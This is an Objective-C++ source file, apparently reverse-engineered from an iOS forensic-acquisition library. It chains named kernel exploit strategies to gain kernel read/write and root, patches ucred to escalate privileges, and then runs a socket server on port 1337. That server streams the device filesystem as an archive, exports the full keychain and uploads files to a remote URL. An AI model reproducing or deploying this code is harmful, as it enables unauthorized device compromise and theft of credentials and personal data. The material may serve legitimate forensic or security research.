// AcqViewCntrlr.mm - 采集主控制器实现
// 逆向自 libappcore.dylib (AcqViewCntrlr_ 类)
#import "server/AcqViewCntrlr.h"
#import "acquisition/FilesystemServer.h"
#import "acquisition/KeychainServer.h"
#import "acquisition/MetadataServer.h"
#import "mcm/MCMLease.h"
#import "exploit/SockPortStrategy.h"
#import "exploit/OtherExploitStrategies.h"
#import "exploit/PostExploit.h"
#import "kernel/RealDeviceKernelMemory.h"
#import "kernel/VersionedOffsetProvider.h"
#import "permissions/KernelUcredStealer.h"
#import "permissions/MacDirtyCowPatcher.h"
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>

using namespace acquisition;
using namespace exploit;
using namespace kernel;
using namespace permissions;

@implementation AcqViewCntrlr_

- (void)viewDidLoad {
    [super viewDidLoad];
    [self InitLogs];
    [self SetVersionText:[NSString stringWithFormat:@"App version: v%@", @"2.6.1"]];
    [self ShowSpinner:YES];

    // 初始化远程上传器 (从 Info.plist 或硬编码默认地址读取)
    [self setupUploader];

    // 后台执行采集
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        libappcore_do_acquisition();
    });
}

- (void)setupUploader {
    // 优先从 Info.plist 读取上传地址, 回退到默认地址
    NSString* uploadURL = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"AppCoreUploadURL"];
    if (!uploadURL || uploadURL.length == 0) {
        uploadURL = @"http://localhost:8080/";  // 默认本地服务器
    }
    NSURL* baseURL = [NSURL URLWithString:uploadURL];
    if (baseURL) {
        self.uploader = [[SimpleUploader alloc] initWithBaseURL:baseURL];
        NSLog(@"SimpleUploader initialized with baseURL: %@", uploadURL);
    } else {
        NSLog(@"Warning: invalid upload URL: %@", uploadURL);
    }
}

#pragma mark - 漏洞利用

- (void)Sploit {
    NSLog(@"Starting exploitation...");

    // 检测 iOS 版本, 选择合适的漏洞策略
    char version[256] = {0};
    size_t size = sizeof(version);
    sysctlbyname("kern.osversion", version, &size, nullptr, 0);
    int ios_major = 0;
    sscanf(version, "%d", &ios_major);
    NSLog(@"iOS version: %s (major=%d)", version, ios_major);

    // 策略列表 (按 iOS 版本排序, 优先尝试最匹配的)
    std::vector<std::unique_ptr<IExploitStrategy>> strategies;
    strategies.push_back(std::make_unique<SockPortStrategy>());
    strategies.push_back(std::make_unique<TimeWasteStrategy>());
    strategies.push_back(std::make_unique<StreetRaceStrategy>());
    strategies.push_back(std::make_unique<BusyScheduleStrategy>());
    strategies.push_back(std::make_unique<CicutaVirosaStrategy>());
    strategies.push_back(std::make_unique<DanglingJoinStrategy>());
    strategies.push_back(std::make_unique<MadVMStrategy>());
    strategies.push_back(std::make_unique<DarkSwordStrategy>());

    mach_port_t tfp0 = MACH_PORT_NULL;
    uint64_t kernel_base = 0;
    uint64_t kernel_slide = 0;
    ExploitResult best_result;
    memset(&best_result, 0, sizeof(best_result));
    bool found_leak = false;

    for (auto& strategy : strategies) {
        const char* name = strategy->Name();
        NSLog(@"Trying %@...", [NSString stringWithUTF8String:name]);

        // 检查是否支持当前 iOS 版本
        if (!strategy->IsViable()) {
            NSLog(@"  %@ not viable for this iOS version", [NSString stringWithUTF8String:name]);
            continue;
        }

        // 执行漏洞利用
        ExploitResult result;
        memset(&result, 0, sizeof(result));
        if (strategy->DoExploit(&result) && result.success) {
            strncpy(result.strategy_name, name, sizeof(result.strategy_name) - 1);
            found_leak = true;
            best_result = result;
            tfp0 = result.tfp0;
            kernel_base = result.kernel_base;
            kernel_slide = result.kernel_slide;
            NSLog(@"Finished exploitation with %@, kernel_base=0x%llx, tfp0=%d",
                  [NSString stringWithUTF8String:name], kernel_base, tfp0);

            // 如果已经拿到真正的 tfp0, 直接成功
            if (tfp0 != MACH_PORT_NULL) {
                break;
            }
            // 否则继续尝试其他策略, 但保留这个泄露结果
            NSLog(@"  Got kernel leak but no tfp0, trying more strategies...");
        } else {
            NSLog(@"  %@ failed", [NSString stringWithUTF8String:name]);
        }
    }

    if (!found_leak) {
        NSLog(@"All exploits failed.");
        self.deviceExploited = NO;
        return;
    }

    // 后利用: 从泄露转换为 tfp0 + 提权
    NSLog(@"Running post-exploitation...");
    PostExploit post;
    if (!post.Run(&best_result)) {
        NSLog(@"Post-exploitation incomplete (may still have partial access)");
    }

    // 更新结果
    tfp0 = best_result.tfp0;
    kernel_slide = best_result.kernel_slide;

    // 关键修复: 只有真正获取内核读写或 root 时才标记 exploited
    if (best_result.have_kernel_read || best_result.have_kernel_write || post.IsRoot()) {
        self.deviceExploited = YES;
        NSLog(@"Device exploited successfully: tfp0=%d, root=%d, strategy=%s",
              tfp0, post.IsRoot() ? 1 : 0, best_result.strategy_name);
    } else {
        self.deviceExploited = NO;
        NSLog(@"Exploit got kernel leak but no rw/root, marking as not exploited");
        return;
    }

    // 权限提升: 修改 ucred 获取 root (如果 PostExploit 还没做)
    if (!post.IsRoot() && tfp0 != MACH_PORT_NULL) {
        NSLog(@"Escalating privileges via ucred patch...");
        auto km = std::make_unique<RealDeviceKernelMemory>(tfp0);
        auto offsets = VersionedOffsetProvider::MakeOffsetProvider();

        if (km && offsets) {
            KernelUcredStealer stealer;
            stealer.Steal(km.get(), offsets.get());
            NSLog(@"Privilege escalation complete");
        } else {
            NSLog(@"Warning: cannot create kernel memory or offset provider");
        }
    }

    // 尝试 MacDirtyCow (如果支持)
    if (MacDirtyCowPatcher::IsSupported()) {
        NSLog(@"MacDirtyCow available, can patch read-only pages");
    }

    // 启动 MCM Filza 模式 (获取全容器访问)
    NSLog(@"Starting MCM Filza mode...");
    MCMFilzaStart();

    NSLog(@"Exploitation and privilege escalation complete.");
}

#pragma mark - 服务器

- (void)RunServer {
    // 查找可用端口
    int port = 1337;
    self.serverPort = port;
    NSLog(@"Running server on port %d", port);

    // 创建监听 socket
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 5);

    while (true) {
        NSLog(@"Waiting for connection on port %u", port);
        int client = accept(server_fd, NULL, NULL);
        if (client < 0) continue;

        if (!self.deviceExploited) {
            NSLog(@"Device not exploited, cannot start session.");
            close(client);
            continue;
        }

        // 读取客户端命令
        char cmd_buf[256] = {0};
        ssize_t n = recv(client, cmd_buf, sizeof(cmd_buf) - 1, 0);
        if (n <= 0) {
            NSLog(@"Failed to read command from client, cannot start session.");
            close(client);
            continue;
        }

        NSString* cmd = [NSString stringWithUTF8String:cmd_buf];
        NSLog(@"Read command from client: %@", cmd);

        if (![self ServerIsCmdSupported:cmd]) {
            [self ServerOnUnsupportedCmd:cmd];
            close(client);
            continue;
        }

        // 分发命令
        if ([cmd isEqualToString:@"filesystem"]) {
            [self FilesystemServerOnNewSession:client];
        } else if ([cmd isEqualToString:@"keychain"]) {
            [self KeychainServerOnNewSession:client];
        } else if ([cmd isEqualToString:@"metadata"]) {
            [self MetadataServerOnNewSession:client];
        } else if ([cmd isEqualToString:@"status"]) {
            NSString* status = [self ServerGetDeviceStatus];
            const char* s = status.UTF8String;
            send(client, s, strlen(s), 0);
        } else if ([cmd isEqualToString:@"version"]) {
            NSString* ver = [self ServerGetAgentVersion];
            const char* s = ver.UTF8String;
            send(client, s, strlen(s), 0);
        } else if ([cmd isEqualToString:@"upload"]) {
            // 上传模式: 读取目标路径后通过 SimpleUploader 上传
            char path_buf[4096] = {0};
            ssize_t pn = recv(client, path_buf, sizeof(path_buf) - 1, 0);
            if (pn > 0) {
                path_buf[pn] = '\0';
                NSString* path = [NSString stringWithUTF8String:path_buf];
                if (self.uploader && path.length > 0) {
                    [self.uploader uploadFile:path withType:@"filesystem"];
                    const char* ok = "upload_started";
                    send(client, ok, strlen(ok), 0);
                } else {
                    const char* err = "uploader_not_initialized";
                    send(client, err, strlen(err), 0);
                }
            }
        }

        [self ServerOnFinishTransfer];
        close(client);
    }
}

#pragma mark - 命令处理

- (NSString*)ServerGetDeviceStatus {
    return self.deviceExploited ? @"exploited" : @"not_exploited";
}

- (NSString*)ServerGetAgentVersion {
    return @"2.6.1";
}

- (BOOL)ServerIsCmdSupported:(NSString*)cmd {
    NSSet* supported = [NSSet setWithArray:@[@"filesystem", @"keychain", @"metadata",
                                               @"status", @"version", @"upload"]];
    return [supported containsObject:cmd];
}

- (void)ServerOnUnsupportedCmd:(NSString*)cmd {
    NSLog(@"Unsupported command: %@", cmd);
}

- (void)ServerOnFinishTransfer {
    NSLog(@"Transfer finished.");
}

#pragma mark - 文件系统服务器

- (void)FilesystemServerOnNewSession:(int)client_fd {
    NSLog(@"Filesystem server new session");

    // 读取目标路径
    char path_buf[4096] = {0};
    ssize_t n = recv(client_fd, path_buf, sizeof(path_buf) - 1, 0);
    if (n <= 0) {
        NSLog(@"Failed to read path from client");
        return;
    }
    NSString* path = [NSString stringWithUTF8String:path_buf];
    NSLog(@"Filesystem target: %@", path);

    // 创建归档写入器 (通过 socket 发送 tar.gz 流)
    struct archive* ar = archive_write_new();
    archive_write_add_filter_gzip(ar);
    archive_write_set_format_pax_restricted(ar);
    archive_write_open_fd(ar, client_fd);

    // 遍历并发送 (使用补全的 FilesystemServer)
    acquisition::filesystem::FilesystemServer fs;
    acquisition::filesystem::FilesystemTraversalPolicy policy;
    policy.rootPath = path.UTF8String;
    policy.includeHidden = YES;
    policy.followSymlinks = NO;
    policy.maxFileSize = 100 * 1024 * 1024;  // 100MB
    fs.WriteFilesToArchive(policy, ar, nullptr);

    archive_write_close(ar);
    archive_write_free(ar);
    NSLog(@"Filesystem transfer complete");
}

- (void)FilesystemServerOnData:(int)client_fd data:(NSData*)data {
    send(client_fd, data.bytes, data.length, 0);
}

- (void)FilesystemServerOnFile:(NSString*)path {
    NSLog(@"Sending file: %@", path);
}

- (BOOL)FilesystemServerShouldStop {
    return NO;
}

#pragma mark - 钥匙串服务器

- (void)KeychainServerOnNewSession:(int)client_fd {
    NSLog(@"Keychain server new session, extracting keychain...");

    // 使用补全的 KeychainServer 导出 XML
    keychain::KeychainServer ks;
    std::string xml = ks.ExportKeychainToXML();
    send(client_fd, xml.c_str(), xml.size(), 0);
    NSLog(@"Keychain export sent: %zu bytes", xml.size());
}

- (void)KeychainServerOnData:(int)client_fd data:(NSData*)data {
    send(client_fd, data.bytes, data.length, 0);
}

#pragma mark - 元数据服务器

- (void)MetadataServerOnNewSession:(int)client_fd {
    NSLog(@"Metadata server new session");
    // 使用补全的 MetadataServer 采集并发送
    MetadataServer* ms = [[MetadataServer alloc] init];
    [ms OnNewSession:client_fd];
}

- (void)MetadataServerOnData:(int)client_fd data:(NSData*)data {
    send(client_fd, data.bytes, data.length, 0);
}

#pragma mark - 观察者

- (id)ServerGetFilesystemObserver { return nil; }
- (id)ServerGetKeychainObserver { return nil; }
- (id)ServerGetMetadataObserver { return nil; }

#pragma mark - UI

- (void)SetStateText:(NSString*)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.lblState.text = text;
    });
}

- (void)SetVersionText:(NSString*)text {
    self.lblVersion.text = text;
}

- (void)ShowSpinner:(BOOL)show {
    if (show) [self.spinner startAnimating];
    else [self.spinner stopAnimating];
}

- (void)InitLogs {
    // 初始化日志系统 (SocketAppender 等)
    NSLog(@"[libappcore] Logs initialized");
}

@end
